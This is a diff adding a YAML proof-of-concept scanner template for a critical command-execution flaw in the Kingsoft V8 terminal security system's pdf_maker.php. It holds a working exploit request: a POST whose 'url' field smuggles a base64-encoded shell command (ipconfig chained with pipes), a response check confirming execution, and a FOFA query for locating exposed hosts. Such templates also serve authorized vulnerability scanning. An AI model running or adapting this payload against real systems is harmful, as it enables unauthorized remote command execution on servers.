@@ -1,0 +1,19 @@
+id: poc-yaml-jinkshan-terminal-security-system-pdf-maker-php-command-execution
+info:
+  name: 金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: 金山终端安全系统
+  fofa: app="猎鹰安全-金山V8+终端安全系统"
+requests:
+- method: POST
+  path: /inter/pdf_maker.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx
+  expression: status_code == 200 && contains(body,"Windows IP") && contains(body,"IPv4")
+    && contains(body,"DNS")
+variables: {}
+transport: http
